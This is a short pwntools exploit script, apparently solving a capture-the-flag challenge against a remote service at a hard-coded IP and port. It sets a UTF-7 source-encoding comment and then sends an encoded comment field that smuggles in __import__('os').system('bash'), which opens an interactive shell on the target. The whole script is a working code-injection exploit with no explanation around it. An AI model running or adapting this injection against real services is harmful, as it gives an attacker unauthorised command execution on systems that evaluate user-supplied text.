from pwn import *

#io = process(['python3','main.py'])
io = remote("74.207.229.59",20240)

io.sendlineafter(b"number: ",b"0")
io.sendlineafter(b"comment: ",b"coding: utf_7")
io.sendlineafter(b"[y/N]: ",b"y")
io.sendlineafter(b"number: ",b"25")
io.sendlineafter(b"comment: ",b'+AAo-__import__("os").system("bash")')
io.sendlineafter(b"[y/N]: ",b"N")
io.sendlineafter(b"palindrome: ",b"whatever")
io.interactive()
